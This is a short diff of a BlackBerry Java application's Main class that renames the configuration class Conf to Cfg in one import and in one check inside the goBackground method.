@@ -12,7 +12,7 @@ package blackberry;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
 import net.rim.device.api.system.Alert;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -183,7 +183,7 @@ public class Main extends UiApplication {
     }*/
 
     public void goBackground() {
-        if (!Conf.IS_UI) {
+        if (!Cfg.IS_UI) {
             return;
         }
 
